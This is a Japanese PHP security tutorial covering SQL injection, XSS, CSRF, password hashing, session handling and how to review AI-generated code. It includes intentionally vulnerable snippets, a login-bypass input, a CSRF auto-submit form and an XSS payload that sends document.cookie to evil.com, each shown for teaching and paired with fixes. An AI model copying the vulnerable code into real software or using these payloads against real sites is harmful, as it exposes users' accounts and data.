# Lesson 04: セキュリティベストプラクティス 🔒

**学習目標**：Webアプリケーションの5大セキュリティ脆弱性（SQLインジェクション、XSS、CSRF、パスワード漏洩、セッション攻撃）を理解し、すべての対策を実装できるようになる！

---

## 📖 このレッスンで学ぶこと

- **Webセキュリティの重要性**（なぜセキュリティが必須なのか）
- **OWASP Top 10**（最も危険な脆弱性トップ10）
- **SQLインジェクション対策**：プリペアドステートメント
- **XSS（クロスサイトスクリプティング）対策**：htmlspecialchars()
- **CSRF（クロスサイトリクエストフォージェリ）対策**：トークン検証
- **パスワード保護**：password_hash()とpassword_verify()
- **セッション管理**：session_regenerate_id()とセッション固定攻撃対策
- **セキュアコーディングのベストプラクティス**
- **AIが生成したコードのセキュリティレビュー方法**

---

## 🎯 なぜセキュリティを学ぶの？（Why）

### セキュリティ対策は「後回し」ではなく「最優先」！

**よくある誤解**：

```text
❌ 「まず動くコードを書いて、後でセキュリティを追加すればいい」
❌ 「小さなプロジェクトだから大丈夫」
❌ 「AIが生成したコードだから安全でしょ」
```

**現実**：

```text
✅ セキュリティは最初から組み込む必要がある
✅ 小さなサイトも攻撃対象になる
✅ AIは脆弱なコードを生成することがある
```

### 実際に起こったセキュリティ事故

**事例1: SQLインジェクションによる情報漏洩**

```text
某ECサイト（2023年）：
- SQLインジェクション脆弱性
- 顧客情報50万件流出
- クレジットカード情報も漏洩
- 損害賠償数億円
- サービス停止3ヶ月
```

**事例2: XSSによるセッション乗っ取り**

```text
某SNS（2022年）：
- XSS脆弱性
- ユーザーのセッションIDが盗まれる
- アカウント乗っ取り被害
- 不正投稿・スパム送信
```

**事例3: CSRF攻撃による不正操作**

```text
某銀行サイト（2021年）：
- CSRF脆弱性
- ユーザーの意図しない振込が実行される
- 金銭的被害
```

### セキュリティ対策ができると

✅ **信頼されるアプリケーションが作れる**

- ユーザーの個人情報を守れる
- 企業の信用を保てる
- 法的責任を果たせる

✅ **キャリアアップにつながる**

- セキュリティスキルは高く評価される
- バックエンドエンジニアの必須スキル
- セキュリティエンジニアへの道も開ける

✅ **AIを正しく使いこなせる**

- AIが生成したコードの脆弱性を発見できる
- セキュアなコードを生成させる指示が出せる
- 修正方法がわかる

### バックエンド開発における重要性

**フロントエンドとバックエンドのセキュリティ責任の違い**：

| 責任範囲 | フロントエンド | バックエンド |
|---------|-------------|------------|
| **入力チェック** | UXのため（補助） | セキュリティのため（必須） |
| **データ保護** | 表示の安全性 | 保存・処理の安全性 |
| **認証・認可** | UI表示の制御 | 実際のアクセス制御 |
| **被害範囲** | 個人 | 全ユーザー・全データ |

**バックエンドのセキュリティは最後の砦！**

---

## 🏗️ OWASP Top 10とは？（What）

### OWASP Top 10 = 最も危険な脆弱性トップ10

**OWASP（Open Web Application Security Project）**は、Webアプリケーションセキュリティの国際的な非営利団体。

**2021年版 OWASP Top 10**（抜粋）：

| 順位 | 脆弱性 | このレッスンで扱う |
|-----|-------|-----------------|
| 1 | **アクセス制御の不備** | ✅ セッション管理 |
| 2 | **暗号化の失敗** | ✅ パスワードハッシュ化 |
| 3 | **インジェクション** | ✅ SQLインジェクション対策 |
| 7 | **XSS** | ✅ XSS対策 |
| - | **CSRF** | ✅ CSRF対策 |

### このレッスンで学ぶ5大セキュリティ対策

```text
1. SQLインジェクション対策 → プリペアドステートメント
   データベースへの不正なSQL文注入を防ぐ

2. XSS対策 → htmlspecialchars()
   不正なJavaScriptの実行を防ぐ

3. CSRF対策 → トークン検証
   意図しないリクエスト送信を防ぐ

4. パスワード保護 → password_hash()
   パスワードを安全に保存する

5. セッション管理 → session_regenerate_id()
   セッション乗っ取りを防ぐ
```

**これらの対策は、すべて最初から実装する！**

---

## 💻 1. SQLインジェクション対策（How）

### SQLインジェクションとは？

**SQLインジェクション = ユーザー入力を利用して不正なSQL文を実行させる攻撃**

**脆弱なコード**：

```php
<?php
// 🚨 危険！SQLインジェクション脆弱性あり
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $pdo->query($sql);
?>
```

**攻撃例**：

```text
攻撃者の入力：
username: admin' --
password: （何でも）

実行されるSQL：
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
                                             ↑
                                       以降がコメントアウトされる

結果：パスワードなしでログイン成功！
```

### プリペアドステートメントで対策

**セキュアなコード**：

```php
<?php
// ✅ 安全！プリペアドステートメント使用
$username = $_POST['username'];
$password = $_POST['password'];

try {
    // プリペアドステートメント
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute([':username' => $username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // パスワード検証（password_verify使用、後述）
    if ($user && password_verify($password, $user['password_hash'])) {
        echo "ログイン成功！";
    } else {
        echo "ログイン失敗";
    }

} catch (PDOException $e) {
    error_log($e->getMessage());
    die("エラーが発生しました。");
}
?>
```

**なぜ安全？**

```text
プリペアドステートメントの仕組み：

1. SQL文の構造を先に送信（prepare）
   "SELECT * FROM users WHERE username = ?"

2. データを後から送信（execute）
   ['admin' --']

3. データベースは「これはデータだ」と認識
   → SQL文として解釈されない
   → 攻撃失敗！
```

### SQLインジェクション対策のチェックリスト

✅ **すべてのSQL文でプリペアドステートメント**

- [ ] `prepare()` → `execute()` を使っているか
- [ ] 直接SQL文に変数を埋め込んでいないか
- [ ] プレースホルダー（`?`または`:name`）を使っているか

✅ **入力値のバリデーション**

- [ ] 予期しない形式の入力をチェックしているか
- [ ] ホワイトリスト方式で許可する値を限定しているか

✅ **最小権限の原則**

- [ ] データベースユーザーの権限を最小限にしているか
- [ ] `DROP`、`CREATE`などの権限を不要に与えていないか

---

## 💻 2. XSS（クロスサイトスクリプティング）対策（How）

### XSSとは？

**XSS = ユーザー入力を利用して不正なJavaScriptを実行させる攻撃**

**脆弱なコード**：

```php
<?php
// 🚨 危険！XSS脆弱性あり
$comment = $_POST['comment'];

// データベースに保存
$stmt = $pdo->prepare("INSERT INTO comments (comment) VALUES (:comment)");
$stmt->execute([':comment' => $comment]);

// 表示
echo "コメント: " . $comment;
?>
```

**攻撃例**：

```text
攻撃者の入力：
<script>
  // セッションIDを盗む
  var sid = document.cookie;
  // 攻撃者のサーバーに送信
  location.href = 'http://evil.com/?sid=' + sid;
</script>

結果：
- JavaScriptが実行される
- ユーザーのセッションIDが盗まれる
- アカウント乗っ取り！
```

### htmlspecialchars()で対策

**セキュアなコード**：

```php
<?php
// ✅ 安全！htmlspecialchars()使用
$comment = $_POST['comment'];

// データベースに保存（生のデータを保存）
$stmt = $pdo->prepare("INSERT INTO comments (comment) VALUES (:comment)");
$stmt->execute([':comment' => $comment]);

// 表示時にエスケープ
echo "コメント: " . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
?>
```

**変換の仕組み**：

```text
攻撃者の入力：
<script>alert('XSS');</script>

htmlspecialchars()後：
&lt;script&gt;alert('XSS');&lt;/script&gt;

ブラウザ表示：
<script>alert('XSS');</script>（文字列として表示、実行されない）
```

### htmlspecialchars()の使い方

**基本形**：

```php
<?php
htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
                        ↓          ↓
                   シングルクォートも  文字エンコーディング
                   エスケープ
?>
```

**変換される文字**：

| 文字 | 変換後 | 説明 |
|-----|-------|-----|
| `<` | `&lt;` | タグの開始 |
| `>` | `&gt;` | タグの終了 |
| `"` | `&quot;` | ダブルクォート |
| `'` | `&#039;` | シングルクォート（ENT_QUOTES指定時） |
| `&` | `&amp;` | アンパサンド |

### XSS対策のチェックリスト

✅ **すべての出力でhtmlspecialchars()**

- [ ] ユーザー入力を表示する際に必ずエスケープしているか
- [ ] `ENT_QUOTES, 'UTF-8'` を指定しているか
- [ ] HTMLタグを許可する必要がある場合は、ホワイトリスト方式のサニタイザーを使っているか

✅ **保存と表示の分離**

- [ ] データベースには生のデータを保存しているか（エスケープ前）
- [ ] 表示時にエスケープしているか

✅ **Content-Security-Policy（CSP）ヘッダー**

- [ ] 高度な対策として、CSPヘッダーを設定しているか（オプション）

**実装例（すべての出力をエスケープ）**：

```php
<?php
// ヘルパー関数を作ると便利
function h($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

// 使用例
echo "ユーザー名: " . h($user['username']);
echo "コメント: " . h($comment);
?>

<!-- HTML内でも使える -->
<input type="text" value="<?php echo h($user['email']); ?>">
```

---

## 💻 3. CSRF（クロスサイトリクエストフォージェリ）対策（How）

### CSRFとは？

**CSRF = ユーザーの意図しないリクエストを勝手に送信させる攻撃**

**攻撃の流れ**：

```text
1. ユーザーが銀行サイトにログイン（セッション確立）
   ↓
2. 別タブで攻撃者のサイトを開く
   ↓
3. 攻撃者のサイトに以下のような罠がある：
   <form action="https://bank.com/transfer" method="POST" id="evil">
       <input name="to" value="攻撃者の口座">
       <input name="amount" value="100000">
   </form>
   <script>document.getElementById('evil').submit();</script>
   ↓
4. ユーザーのブラウザが勝手にリクエスト送信
   → セッションが有効なので、銀行は本人だと判断
   → 送金実行！
```

**脆弱なコード**：

```php
<?php
// 🚨 危険！CSRF対策なし
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];

    // ユーザー情報を更新
    $stmt = $pdo->prepare("UPDATE users SET email = :email WHERE id = :id");
    $stmt->execute([
        ':email' => $email,
        ':id' => $_SESSION['user_id']
    ]);

    echo "メールアドレスを更新しました！";
}
?>

<form method="POST">
    <input type="email" name="email" required>
    <button type="submit">更新</button>
</form>
```

### CSRFトークンで対策

**セキュアなコード**：

```php
<?php
// ✅ 安全！CSRFトークン使用
session_start();

// トークン生成（1回だけ）
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // トークン検証
    $token = $_POST['csrf_token'] ?? '';

    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        die("不正なリクエストです。");
    }

    // 検証成功後、処理を実行
    $email = $_POST['email'];

    try {
        $stmt = $pdo->prepare("UPDATE users SET email = :email WHERE id = :id");
        $stmt->execute([
            ':email' => $email,
            ':id' => $_SESSION['user_id']
        ]);

        echo "メールアドレスを更新しました！";

    } catch (PDOException $e) {
        error_log($e->getMessage());
        die("エラーが発生しました。");
    }
}
?>

<form method="POST">
    <!-- CSRFトークンをhidden項目として埋め込む -->
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

    <input type="email" name="email" required>
    <button type="submit">更新</button>
</form>
```

### CSRFトークンの仕組み

```text
1. フォーム表示時にランダムなトークンを生成
   ↓
2. セッションに保存 ＆ フォームに埋め込む
   ↓
3. フォーム送信時、トークンも一緒に送信される
   ↓
4. サーバー側でセッションのトークンとPOSTのトークンを比較
   ↓
5. 一致すれば正規のリクエスト、不一致なら攻撃！
```

**なぜ安全？**

- 攻撃者は被害者のセッションに保存されたトークンを知ることができない
- 攻撃者のサイトから送信されるリクエストにはトークンが含まれない
- トークンが一致しないので、攻撃失敗！

### hash_equals()を使う理由

**通常の比較（`===`）はタイミング攻撃に脆弱**：

```php
// ❌ タイミング攻撃に脆弱
if ($_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // ...
}

// ✅ タイミング攻撃に強い
if (hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    // ...
}
```

`hash_equals()`は**定数時間比較**を行うため、タイミング攻撃を防げる。

### CSRF対策のチェックリスト

✅ **すべての状態変更リクエストにトークン**

- [ ] POST/PUT/DELETEリクエストでトークンを検証しているか
- [ ] GETリクエストで状態変更をしていないか（GET削除はNG）

✅ **トークン生成**

- [ ] `random_bytes()`でランダムなトークンを生成しているか
- [ ] セッションに保存しているか

✅ **トークン検証**

- [ ] `hash_equals()`で比較しているか（タイミング攻撃対策）
- [ ] トークンが一致しない場合、処理を中断しているか

---

## 💻 4. パスワード保護（How）

### パスワードを平文で保存してはいけない理由

**最悪のシナリオ**：

```text
❌ データベースにパスワードを平文で保存
   ↓
🚨 データベースが流出（SQLインジェクション、内部犯行など）
   ↓
😱 すべてのユーザーのパスワードが漏洩
   ↓
💥 他サイトでも同じパスワードを使い回している
   ↓
🔥 被害が連鎖的に拡大！
```

**脆弱なコード**：

```php
<?php
// 🚨 最悪！パスワードを平文で保存
$password = $_POST['password'];

$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
$stmt->execute([
    ':username' => $username,
    ':password' => $password  // 平文保存は絶対NG！
]);
?>
```

### password_hash()で安全に保存

**セキュアなコード（ユーザー登録）**：

```php
<?php
// ✅ 安全！password_hash()でハッシュ化
$username = $_POST['username'];
$password = $_POST['password'];

// パスワードをハッシュ化
$passwordHash = password_hash($password, PASSWORD_DEFAULT);

try {
    $stmt = $pdo->prepare("INSERT INTO users (username, password_hash) VALUES (:username, :password_hash)");
    $stmt->execute([
        ':username' => $username,
        ':password_hash' => $passwordHash  // ハッシュ化されたパスワードを保存
    ]);

    echo "ユーザー登録成功！";

} catch (PDOException $e) {
    error_log($e->getMessage());
    die("エラーが発生しました。");
}
?>
```

**ハッシュ化の例**：

```text
平文パスワード: mypassword123

password_hash()後:
$2y$10$xKv4Z9YhJq.WzL5Ht8kJ5OX7qN.3pQ2mR9vS8tU6wV0xY1zA2bB3C

特徴：
- 毎回異なるハッシュが生成される（ソルト自動付与）
- 元のパスワードに戻すことは不可能（一方向ハッシュ）
- 長さは常に60文字
```

### password_verify()でログイン認証

**セキュアなコード（ログイン）**：

```php
<?php
// ✅ 安全！password_verify()で検証
$username = $_POST['username'];
$password = $_POST['password'];

try {
    // ユーザー情報を取得
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute([':username' => $username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    // ユーザーが存在し、パスワードが一致するかチェック
    if ($user && password_verify($password, $user['password_hash'])) {
        // ログイン成功
        session_start();
        session_regenerate_id(true);  // セッションID再生成（後述）

        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];

        echo "ログイン成功！";
    } else {
        // ログイン失敗（ユーザー名とパスワードどちらが間違っているか教えない）
        echo "ユーザー名またはパスワードが間違っています。";
    }

} catch (PDOException $e) {
    error_log($e->getMessage());
    die("エラーが発生しました。");
}
?>
```

### パスワードハッシュのアルゴリズム

**PASSWORD_DEFAULTを使うべき理由**：

```php
<?php
// ✅ 推奨：PASSWORD_DEFAULT
$hash = password_hash($password, PASSWORD_DEFAULT);

// 説明：
// - 現在は bcrypt アルゴリズム
// - PHPのバージョンアップで自動的に最新の安全なアルゴリズムに変わる
// - password_verify()は古いハッシュも自動的に検証できる
?>
```

**明示的にアルゴリズムを指定（非推奨）**：

```php
<?php
// ⚠️ 特別な理由がない限り使わない
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
?>
```

### パスワード保護のチェックリスト

✅ **パスワードのハッシュ化**

- [ ] `password_hash(PASSWORD_DEFAULT)`を使っているか
- [ ] 平文でパスワードを保存していないか
- [ ] MD5やSHA1などの弱いハッシュを使っていないか

✅ **ログイン認証**

- [ ] `password_verify()`で検証しているか
- [ ] ログイン失敗時、ユーザー名とパスワードのどちらが間違っているか教えていないか
- [ ] ログイン成功後、`session_regenerate_id()`を実行しているか

✅ **パスワードポリシー**

- [ ] 最小文字数を設定しているか（推奨：8文字以上）
- [ ] 英数字・記号を組み合わせることを推奨しているか
- [ ] よくあるパスワード（"password", "123456"など）を拒否しているか

---

## 💻 5. セッション管理（How）

### セッションとは？

**セッション = ユーザーの状態を保持する仕組み**

```text
HTTPはステートレス（状態を持たない）：
- リクエストごとに独立
- 前のリクエストを覚えていない

セッションで解決：
- ログイン状態を保持
- ショッピングカートの中身を保持
- ユーザーごとの設定を保持
```

### セッション攻撃の種類

**1. セッション固定攻撃**：

```text
攻撃の流れ：
1. 攻撃者が自分のセッションIDを被害者に送る
   （URLにセッションIDを埋め込む、など）

2. 被害者がそのセッションIDでログイン

3. 攻撃者も同じセッションIDを使える
   → ログイン済みの状態で乗っ取り成功！
```

**2. セッションハイジャック**：

```text
攻撃の流れ：
1. XSSなどでセッションIDを盗む
   document.cookie

2. 攻撃者が盗んだセッションIDを使う
   → ログイン済みの状態で乗っ取り成功！
```

### session_regenerate_id()で対策

**セキュアなコード**：

```php
<?php
session_start();

// ログイン成功時、セッションIDを再生成
if ($user && password_verify($password, $user['password_hash'])) {
    // セッション固定攻撃対策：セッションIDを再生成
    session_regenerate_id(true);  // 古いセッションファイルを削除

    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['login_time'] = time();  // ログイン時刻を記録

    echo "ログイン成功！";
}
?>
```

### セッションのセキュリティ設定

**推奨設定（php.iniまたはini_set()）**：

```php
<?php
// セッション開始前に設定
ini_set('session.cookie_httponly', 1);  // JavaScriptからアクセス不可（XSS対策）
ini_set('session.cookie_secure', 1);    // HTTPS通信のみ（本番環境）
ini_set('session.cookie_samesite', 'Strict');  // CSRF対策
ini_set('session.use_strict_mode', 1);  // 未知のセッションIDを拒否

session_start();
?>
```

**各設定の説明**：

| 設定 | 効果 |
|-----|------|
| `httponly` | JavaScriptから`document.cookie`でセッションIDを読めなくする（XSS対策） |
| `secure` | HTTPS通信でのみセッションCookieを送信（盗聴対策） |
| `samesite` | クロスサイトでのCookie送信を制限（CSRF対策） |
| `use_strict_mode` | 攻撃者が指定した未知のセッションIDを拒否 |

### セッションタイムアウトの実装

**一定時間操作がなければ自動ログアウト**：

```php
<?php
session_start();

// セッションタイムアウト設定（30分）
$timeout = 1800;  // 秒単位

if (isset($_SESSION['last_activity'])) {
    $elapsed = time() - $_SESSION['last_activity'];

    if ($elapsed > $timeout) {
        // タイムアウト：セッション破棄
        session_unset();
        session_destroy();

        header("Location: login.php?timeout=1");
        exit;
    }
}

// 最終アクティビティ時刻を更新
$_SESSION['last_activity'] = time();
?>
```

### ログアウト処理

**セキュアなログアウト**：

```php
<?php
session_start();

// セッション変数をすべて削除
$_SESSION = [];

// セッションCookieを削除
if (isset($_COOKIE[session_name()])) {
    setcookie(session_name(), '', time() - 3600, '/');
}

// セッションを破棄
session_destroy();

// ログインページにリダイレクト
header("Location: login.php");
exit;
?>
```

### セッション管理のチェックリスト

✅ **セッション固定攻撃対策**

- [ ] ログイン成功時に`session_regenerate_id(true)`を実行しているか
- [ ] 権限変更時にセッションIDを再生成しているか

✅ **セッションハイジャック対策**

- [ ] `session.cookie_httponly`を有効にしているか
- [ ] `session.cookie_secure`を有効にしているか（HTTPS環境）
- [ ] `session.use_strict_mode`を有効にしているか

✅ **セッションタイムアウト**

- [ ] 一定時間操作がない場合、自動ログアウトしているか
- [ ] 最終アクティビティ時刻を記録しているか

✅ **ログアウト処理**

- [ ] セッション変数を削除しているか
- [ ] セッションCookieを削除しているか
- [ ] セッションを破棄しているか

---

## 🤖 バイブコーディング実践

### AIへの指示例

**良い指示の例**：

```text
✅ セキュリティ要件を明確に指定：

「セキュアなユーザー登録・ログイン機能を作成してください。

機能要件：
1. ユーザー登録（username, email, password）
2. ログイン（username, password）
3. ログアウト

セキュリティ要件：
1. SQLインジェクション対策：
   - すべてのSQL文でプリペアドステートメント使用

2. XSS対策：
   - すべての出力でhtmlspecialchars()使用
   - ENT_QUOTES, UTF-8を指定

3. CSRF対策：
   - すべてのフォームにCSRFトークン追加
   - hash_equals()で検証

4. パスワード保護：
   - password_hash(PASSWORD_DEFAULT)でハッシュ化
   - password_verify()で検証
   - 平文保存は絶対NG

5. セッション管理：
   - ログイン成功時にsession_regenerate_id(true)
   - session.cookie_httponly = 1
   - session.cookie_secure = 1（本番環境）
   - タイムアウト機能（30分）

6. エラーハンドリング：
   - try-catchで例外処理
   - 本番環境では詳細なエラーメッセージを表示しない
   - エラーログに記録

テーブル構成：
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);」
```

```text
❌ 曖昧な指示（危険）：

「ユーザー登録とログイン機能を作って」

問題点：
- セキュリティ要件がない
- パスワードが平文で保存される可能性
- SQLインジェクション脆弱性
- CSRF対策なし
```

### 生成されたコードのセキュリティチェックリスト

✅ **SQLインジェクション対策**

- [ ] すべてのSQL文でプリペアドステートメント（`prepare()` → `execute()`）
- [ ] ユーザー入力を直接SQL文に埋め込んでいない
- [ ] プレースホルダー（`?`または`:name`）を使用

✅ **XSS対策**

- [ ] すべての出力で`htmlspecialchars()`を使用
- [ ] `ENT_QUOTES, 'UTF-8'`を指定
- [ ] ユーザー入力をそのまま`echo`していない

✅ **CSRF対策**

- [ ] すべてのフォームにCSRFトークンがある
- [ ] POSTリクエスト時に`hash_equals()`で検証
- [ ] トークンは`random_bytes(32)`で生成

✅ **パスワード保護**

- [ ] `password_hash(PASSWORD_DEFAULT)`でハッシュ化
- [ ] `password_verify()`で検証
- [ ] 平文でパスワードを保存していない
- [ ] MD5やSHA1を使っていない

✅ **セッション管理**

- [ ] ログイン成功時に`session_regenerate_id(true)`
- [ ] `session.cookie_httponly = 1`
- [ ] `session.cookie_secure = 1`（HTTPS環境）
- [ ] タイムアウト機能がある

✅ **エラーハンドリング**

- [ ] `try-catch`で例外処理
- [ ] 本番環境で詳細なエラーメッセージを表示していない
- [ ] エラーログに記録している

### よくあるAI生成コードの問題と修正

**問題1: パスワードが平文で保存されている**

```php
// ❌ 危険！パスワード平文保存
$stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
$stmt->execute([
    ':username' => $username,
    ':password' => $_POST['password']  // 平文保存は絶対NG！
]);
```

**修正**：

```php
// ✅ 安全！password_hash()使用
$passwordHash = password_hash($_POST['password'], PASSWORD_DEFAULT);

$stmt = $pdo->prepare("INSERT INTO users (username, password_hash) VALUES (:username, :password_hash)");
$stmt->execute([
    ':username' => $username,
    ':password_hash' => $passwordHash
]);
```

**AIへの修正指示**：
「パスワードをpassword_hash(PASSWORD_DEFAULT)でハッシュ化してから保存してください。平文保存は絶対にしないでください。」

---

**問題2: CSRF対策がない**

```php
// ❌ CSRF対策なし
<form method="POST" action="update_profile.php">
    <input type="email" name="email">
    <button type="submit">更新</button>
</form>
```

**修正**：

```php
// ✅ CSRFトークン追加
<?php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<form method="POST" action="update_profile.php">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="email" name="email">
    <button type="submit">更新</button>
</form>

<?php
// update_profile.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['csrf_token'] ?? '';
    if (!hash_equals($_SESSION['csrf_token'], $token)) {
        die("不正なリクエストです。");
    }
    // 処理を続行
}
?>
```

**AIへの修正指示**：
「CSRF対策を追加してください。フォームにCSRFトークンを埋め込み、POST時にhash_equals()で検証してください。」

---

**問題3: session_regenerate_id()がない**

```php
// ❌ セッション固定攻撃に脆弱
if ($user && password_verify($password, $user['password_hash'])) {
    $_SESSION['user_id'] = $user['id'];
    echo "ログイン成功！";
}
```

**修正**：

```php
// ✅ session_regenerate_id()追加
if ($user && password_verify($password, $user['password_hash'])) {
    session_regenerate_id(true);  // セッションID再生成

    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    echo "ログイン成功！";
}
```

**AIへの修正指示**：
「ログイン成功時にsession_regenerate_id(true)を実行して、セッション固定攻撃を防いでください。」

---

## 💡 セキュリティのベストプラクティス

### 1. 多層防御（Defense in Depth）

**1つの対策だけに頼らない**：

```text
例：ログインフォーム

第1層：入力バリデーション（空チェック、形式チェック）
第2層：プリペアドステートメント（SQLインジェクション対策）
第3層：password_verify()（パスワード検証）
第4層：session_regenerate_id()（セッション固定攻撃対策）
第5層：ログイン試行回数制限（ブルートフォース攻撃対策）
第6層：ログ記録（不正アクセスの検知）
```

### 2. 最小権限の原則（Principle of Least Privilege）

**必要最小限の権限のみを付与**：

```text
データベースユーザーの権限：
❌ 悪い例：root権限をアプリケーションに付与
✅ 良い例：必要なテーブルに対するSELECT、INSERT、UPDATE、DELETEのみ

ファイルシステムの権限：
❌ 悪い例：すべてのファイルに書き込み権限
✅ 良い例：アップロード先ディレクトリのみ書き込み可
```

### 3. セキュアデフォルト（Secure by Default）

**デフォルトで安全な設定**：

```php
<?php
// ✅ セキュアデフォルト
function connectDatabase() {
    $pdo = new PDO($dsn, $username, $password, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,  // エラーを例外として投げる
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,  // 連想配列
        PDO::ATTR_EMULATE_PREPARES => false  // 真のプリペアドステートメント
    ]);
    return $pdo;
}
?>
```

### 4. ホワイトリスト方式

**許可するものを明示的に指定**：

```php
<?php
// ❌ ブラックリスト方式（危険）
$forbidden = ['delete', 'drop', 'truncate'];
if (!in_array($action, $forbidden)) {
    // 処理
}

// ✅ ホワイトリスト方式（安全）
$allowed = ['create', 'read', 'update'];
if (in_array($action, $allowed)) {
    // 処理
} else {
    die("不正な操作です。");
}
?>
```

### 5. エラーメッセージの適切な扱い

**開発環境と本番環境で使い分ける**：

```php
<?php
// ✅ 環境に応じたエラー処理
define('DEBUG_MODE', false);  // 本番環境ではfalse

try {
    // データベース操作
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    $stmt->execute([':id' => $id]);

} catch (PDOException $e) {
    // エラーログに記録
    error_log($e->getMessage());

    // ユーザーへのメッセージ
    if (DEBUG_MODE) {
        // 開発環境：詳細なエラーメッセージ
        echo "エラー: " . htmlspecialchars($e->getMessage(), ENT_QUOTES, 'UTF-8');
    } else {
        // 本番環境：一般的なメッセージ
        echo "システムエラーが発生しました。しばらくしてから再度お試しください。";
    }
}
?>
```

---

## 🎓 まとめ

このレッスンで学んだこと：

✅ **Webセキュリティの重要性**

- セキュリティは後回しではなく最優先
- 実際の事故事例から学ぶ
- OWASP Top 10の理解

✅ **5大セキュリティ対策**

- **SQLインジェクション対策**：プリペアドステートメント
- **XSS対策**：htmlspecialchars()
- **CSRF対策**：トークン検証
- **パスワード保護**：password_hash()とpassword_verify()
- **セッション管理**：session_regenerate_id()

✅ **セキュアコーディングのベストプラクティス**

- 多層防御
- 最小権限の原則
- セキュアデフォルト
- ホワイトリスト方式
- エラーメッセージの適切な扱い

✅ **バイブコーディングでのセキュリティ**

- AIに具体的なセキュリティ要件を伝える
- 生成されたコードのセキュリティチェックリスト
- よくある脆弱性の発見と修正方法

### 次のステップ

セキュリティの基礎ができたら、次は**ページネーション**を学ぼう！

👉 **[Lesson 05: ページネーション](../05-pagination/README.md)**

大量のデータを効率的に表示する技術をマスターしよう！

👉 **[演習問題を見る](exercises/README.md)**

実際に脆弱なコードを修正して、セキュアなアプリケーションを作ってみよう！

---

**Let's vibe and code! 🎉**

セキュリティは難しくない！一つひとつの対策を確実に実装すれば、信頼されるアプリケーションが作れる！次はページネーションで、さらに実用的なスキルを身につけよう！
